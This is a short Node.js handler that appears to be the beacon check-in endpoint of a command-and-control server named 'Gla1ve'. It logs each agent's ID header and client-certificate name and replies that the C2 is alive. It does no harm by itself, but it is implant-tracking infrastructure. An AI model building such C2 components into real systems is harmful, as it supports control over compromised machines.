module.exports = (req, res) => {
    const agentID = req.headers['x-agent-id'] || 'unknown';
    const clientCN = req.socket.getPeerCertificate().subject.CN || 'unknown';
    console.log(`AGENT BEACON -> ID: ${agentID} | Cert CN: ${clientCN}`);
    res.status(200).send('Gla1ve C2 alive');
};

